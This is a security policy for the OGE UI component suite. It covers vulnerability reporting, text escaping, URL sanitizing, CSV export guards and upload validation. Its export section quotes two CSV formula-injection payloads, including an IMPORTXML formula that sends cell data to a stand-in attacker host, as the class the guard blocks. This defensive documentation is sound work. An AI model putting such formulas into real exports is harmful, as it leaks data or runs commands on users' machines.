# Security Policy

## Supported versions

Security fixes land on the latest minor release of the `0.x` line. Older
versions do not receive patches — upgrade to the latest release.

## Reporting a vulnerability

Please **do not open a public issue** for security problems.

- Email **security@ogeui.com** with a description, affected package/version
  and reproduction steps, or
- use GitHub's private reporting: **Security → Report a vulnerability** on
  the [oge-ui/oge-ui](https://github.com/oge-ui/oge-ui) repository.

This is a small project; you will normally hear back within a few days. We
ask for a reasonable window (up to 90 days) to ship a fix before public
disclosure; credit is given in the release notes unless you prefer
otherwise.

## How the suite handles untrusted data

Every component in this suite renders data the host application did not
write — rows from an API, menu items from a CMS, file names a user chose. The
rules below are what that data is allowed to do.

### Cell and node text is text

Row data reaches the DOM as text nodes and attributes, never as markup. The
one place row data becomes HTML is search highlighting, where the cell text is
HTML-escaped first and only the `<mark>` wrapper is added by the library
(`buildSearchHighlightHtml`), so the rendered `textContent` is byte-for-byte
the input. The result is trusted at the render layer _because_ it was built by
escaping, not because it was assumed safe.

Two APIs deliberately accept markup, and say so at the call site:

- `OgeBpmnOverlay.html` — bound through Angular's sanitizing `[innerHTML]`;
  script tags and inline event handlers are stripped, but do not pass markup
  you would not put in your own template.
- Angular templates you supply for cells, items and columns are your code and
  are compiled as such.

### URLs are sanitized in both render layers

Data-driven `url` fields (menu items, breadcrumbs, menubar items) can carry a
`javascript:` scheme. Angular's `[href]` binding neutralizes those through
`DomSanitizer`; React's `href={…}` does not, so the React layer routes every
data-driven `href`/`src` through `sanitizeUrl` / `sanitizeResourceUrl` from
`@oge-ui/behavior`, which rejects the executing schemes and returns
`about:blank`. Both are exported — use them if you render your own links from
the same data.

### Exports cannot execute on open

`getCsv()` / `exportCsv()` (grid, tree list, pivot) and clipboard TSV prefix
any cell that opens with `=`, `+`, `-`, `@`, tab or CR with an apostrophe, so
a spreadsheet reads it as text rather than a formula — CSV formula injection
(CWE-1236), the `=cmd|…!A1` and `=IMPORTXML("http://attacker/?"&A1)` class.
Plain numbers are exempt, so numeric columns stay numeric. Pass
`formulaGuard: false` where the file is consumed by a parser rather than
opened in Excel or Sheets. The `.xlsx` exporters write typed cells, which
Excel never evaluates, so they need no guard.

### Uploads validate on the client only

`@oge-ui/upload` enforces `accept`, `allowedFileExtensions` and the size
bounds in the browser to give the user immediate feedback. That is a UX
control, not a security control: **re-validate type, size and content on the
server**. The uploader will happily send whatever your server accepts.

### Content Security Policy

The packages ship no inline scripts and evaluate no strings — no `eval`, no
`new Function`, no `document.write`. Inline styles are used for layout
(virtual-scroll offsets, panel positioning), so a strict policy needs
`style-src 'self' 'unsafe-inline'`. `script-src 'self'` is enough.

## Dependencies

Nothing in this workspace's `dependencies` or `devDependencies` is shipped to
consumers: the published packages declare Angular, React and the optional
export libraries as **peers**, and bundle nothing. A `npm audit` finding
against the repo is therefore a build-time issue for us, not an exposure for
you — CI fails the build on any advisory at moderate or above so it stays
that way.

`exceljs`, `jspdf` and `jspdf-autotable` are optional peers loaded only by the
`@oge-ui/*/export-excel` and `export-pdf` entry points. Advisories in those
libraries belong to their maintainers; reports about how OGE UI _uses_ them
are in scope here.

## Scope

In scope: XSS through any component's data path, formula/CSV injection in the
exporters, prototype pollution through state restore, and any way component
markup escapes the sanitizer.

Out of scope: vulnerabilities requiring the host application to pass attacker
controlled values to the APIs documented above as accepting markup; the
demo site's third-party analytics; and issues in peer dependencies.
